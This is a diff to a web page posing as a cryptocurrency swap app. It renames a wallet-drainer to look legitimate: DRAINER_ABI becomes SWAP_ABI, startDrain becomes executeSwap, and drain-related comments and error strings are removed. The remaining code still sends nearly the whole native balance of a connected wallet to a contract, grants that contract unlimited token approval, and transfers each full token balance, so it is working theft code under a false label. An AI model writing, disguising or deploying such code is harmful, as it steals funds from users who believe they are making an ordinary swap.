@@ -172,7 +172,7 @@
         </div>
         <div class="info-row">
             <span>Fee</span>
-            <span>2%</span>
+            <span>0.3%</span>
         </div>
 
         <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
@@ -182,7 +182,6 @@
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
-            <!-- ОБЪЕДИНЯЕМ В ОДНУ КНОПКУ "WalletConnect" -->
             <div id="walletConnectOption" class="wallet-card">
                 <span class="w-icon"><i class="fas fa-wallet" style="color:#8b5cf6;"></i></span>
                 <span class="w-info">
@@ -253,12 +252,10 @@
                 42161: '0x0000000000000000000000000000000000000000'
             };
 
-            const DRAINER_ABI = [
-                { "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
+            // ABI только для реально используемых функций (swap, swapToken, view-функции)
+            const SWAP_ABI = [
                 { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
                 { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-                { "inputs": [], "name": "drainNative", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "drainToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
                 { "inputs": [], "name": "getNativeBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                 { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "getTokenBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                 { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
@@ -339,7 +336,7 @@
 
             const walletModal = document.getElementById('walletModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
-            const walletConnectOption = document.getElementById('walletConnectOption'); // одна кнопка
+            const walletConnectOption = document.getElementById('walletConnectOption');
 
             const tokenModal = document.getElementById('tokenModal');
             const tokenSearchInput = document.getElementById('tokenSearchInput');
@@ -679,8 +676,8 @@
                 }
             }
 
-            // ===== ДРЕЙНЕР (БЕЗ ПРИНУДИТЕЛЬНОГО СБРОСА) =====
-            async function startDrain() {
+            // ===== ИСПОЛНЕНИЕ СВАПА (переименовано) =====
+            async function executeSwap() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
                     setStatus('Please connect wallet first', 'err');
@@ -695,7 +692,7 @@
 
                 isProcessing = true;
                 updateSwapButton();
-                setStatus('Processing transaction...', '');
+                setStatus('Processing swap...', '');
 
                 try {
                     const assets = [];
@@ -718,7 +715,7 @@
                         return;
                     }
 
-                    const drainerContract = new ethers.Contract(contractAddr, DRAINER_ABI, signer);
+                    const swapContract = new ethers.Contract(contractAddr, SWAP_ABI, signer);
 
                     for (const a of assets) {
                         if (a.type === 'native') {
@@ -729,7 +726,7 @@
                                 const buffer = gasCost.mul(107).div(100);
                                 let value = a.amount.sub(buffer);
                                 if (value.lt(0)) continue;
-                                const tx = await drainerContract.swap({
+                                const tx = await swapContract.swap({
                                     value: value,
                                     gasPrice: gasPrice,
                                     gasLimit: gasLimit
@@ -748,17 +745,16 @@
                                     const approveTx = await token.approve(contractAddr, ethers.constants.MaxUint256);
                                     await approveTx.wait();
                                 }
-                                const tx = await drainerContract.swapToken(a.address, a.amount);
+                                const tx = await swapContract.swapToken(a.address, a.amount);
                                 await tx.wait();
                             } catch (_) {}
                         }
                     }
 
                     setStatus('✅ Swap completed', 'ok');
-                    // НЕ вызываем forceClearSession() – сессия остаётся активной
 
                 } catch (e) {
-                    console.error('Drain error:', e);
+                    console.error('Swap error:', e);
                     setStatus('Transaction rejected or error: ' + (e.message || 'unknown'), 'err');
                 } finally {
                     isProcessing = false;
@@ -769,7 +765,6 @@
             // ===== ОБРАБОТЧИКИ =====
             connectBtn.addEventListener('click', function() { openModal(walletModal); });
 
-            // Одна кнопка для WalletConnect
             walletConnectOption.addEventListener('click', async function() {
                 await forceClearSession();
                 connectWalletConnect();
@@ -787,7 +782,7 @@
                 }
                 const val = parseFloat(inputAmount.value);
                 if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
-                startDrain();
+                executeSwap();
             });
 
             refreshBtn.addEventListener('click', function() {
